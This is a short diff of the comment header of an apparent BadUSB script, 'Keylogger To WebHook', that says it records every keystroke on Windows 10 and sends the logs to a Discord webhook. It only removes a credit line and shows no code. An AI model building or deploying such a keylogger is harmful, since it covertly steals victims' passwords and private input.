@@ -2,7 +2,6 @@ REM Title: Keylogger To WebHook - Chrome Extension
 REM Author: @beigeworm
 REM Description: This script logs all Keystrokes and posts results to a discord webhook when the keyboard goes inactive for more than 10 secs.
 REM Target: Windows 10
-REM Credit: Jakov
 REM *SETUP*
 REM replace DISCORD_WEBHOOK_HERE with your Discord Webhook.
 
